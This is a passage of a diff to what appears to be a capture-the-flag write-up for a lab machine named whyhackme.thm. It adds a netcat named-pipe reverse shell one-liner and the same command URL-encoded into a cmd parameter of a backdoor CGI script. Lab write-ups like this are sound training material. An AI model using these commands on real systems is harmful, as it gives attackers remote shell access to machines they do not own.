@@ -172,7 +172,10 @@ jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEP
 jack@ubuntu:/opt$ ss -tlnup | grep "41312"
 tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
 
-<h3>Get Reverse Shell </h3>
+<h3>Get Reverse Shell</h3>
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.x.x.x 4444 >/tmp/f
+url encode
 
 https://whyhackme.thm:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.x.x.x%204444%20%3E%2Ftmp%2Ff
 
